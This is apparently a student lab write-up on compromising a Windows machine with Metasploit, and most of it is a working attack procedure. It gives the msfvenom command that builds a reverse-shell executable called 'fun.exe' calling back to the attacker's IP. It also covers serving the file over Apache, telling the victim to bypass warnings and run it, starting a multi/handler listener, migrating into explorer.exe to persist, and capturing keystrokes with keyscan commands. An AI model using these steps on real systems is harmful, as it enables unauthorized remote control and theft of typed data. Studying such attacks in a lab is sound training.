Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_23_38](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/97641bd9-a1de-4183-a479-ab01f69198c5)

Create a malicious executable file fun.exe using msfvenom command

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_25_11](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/2f7d21e8-ac0b-4529-b7b3-a45679f82ba3)

copy the fun.exe into the apache /var/www/html folder


Start apache server

sudo systemctl apache2 start

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_27_19](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/33b8fa8c-e0fe-4284-8005-035ad5941078)

Check the status of apache2

Invoke msfconsole:

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_29_04](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/eb634194-da71-401f-b3c4-3b7608784aaf)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_31_33](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/e90489e5-9bcb-4f59-b2d7-a9f5cf05bef6)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads. 

Bypass any warning boxes, double-click the file, and allow it to run.

![VirtualBox_Windows 7_27_04_2024_14_35_20](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/e254c516-d158-474c-be36-929702a9f334)

On kali give the command exploit

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_27_04_2024_14_31_33](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/60ce3e07-c61d-43a0-a87e-824ef27994d0)

To see a list of processes, at the meterpreter > prompt, execute this command:

ps  ⇒ can see the fun.exe process running with pid 1156

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_35_53](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/19707a1d-9ab5-4cb3-a0a5-bb77997db1b2)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.

To become more persistent, we'll migrate to a process that will last longer.

Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_37_07](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/22cd7317-cb46-4df4-94b0-62ba262b3c26)

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_37_53](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/c2356dfb-4329-4f6b-b35c-45b526e5e643)

keyscan_dump	Shows the keystrokes captured so far

![VirtualBox_kali-linux-2023 4-virtualbox-amd64_29_04_2024_08_41_09](https://github.com/Aishwarya-TM/EH-EX-6/assets/127846109/6a746190-c48c-49ea-8e44-a1391edca22b)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
